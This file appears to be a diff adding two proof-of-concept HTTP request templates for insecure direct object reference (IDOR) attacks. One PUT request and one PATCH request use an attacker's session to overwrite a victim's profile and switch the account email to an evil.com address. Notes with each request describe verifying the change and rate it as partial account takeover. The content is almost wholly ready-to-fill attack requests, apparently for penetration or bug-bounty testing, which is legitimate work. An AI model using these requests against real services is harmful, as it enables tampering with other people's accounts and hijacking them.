@@ -1,0 +1,41 @@
+### IDOR PoC — PUT Request (Full Update)
+### Save this as: put_idor_ENDPOINT.http
+
+PUT /api/user/profile HTTP/1.1
+Host: target.example.com
+Content-Type: application/json
+Accept: application/json
+Cookie: session=ATTACKER_SESSION_TOKEN
+Authorization: Bearer ATTACKER_TOKEN
+
+{
+  "user_id": "VICTIM_USER_ID",
+  "full_name": "Attacker Modified",
+  "email": "attacker@evil.com",
+  "phone": "9999999999"
+}
+
+---
+### Expected: Victim's full profile overwritten using attacker's session
+### Proof: Login as victim — confirm data was changed to attacker's values
+
+---
+
+### IDOR PoC — PATCH Request (Partial Update)
+### Save this as: patch_idor_ENDPOINT.http
+
+PATCH /api/account/settings HTTP/1.1
+Host: target.example.com
+Content-Type: application/json
+Accept: application/json
+Cookie: session=ATTACKER_SESSION_TOKEN
+Authorization: Bearer ATTACKER_TOKEN
+
+{
+  "account_id": "VICTIM_ACCOUNT_ID",
+  "email": "hijacked@evil.com"
+}
+
+---
+### Expected: Only the specified field of victim's account is updated
+### Severity: High (write IDOR — partial account takeover possible)
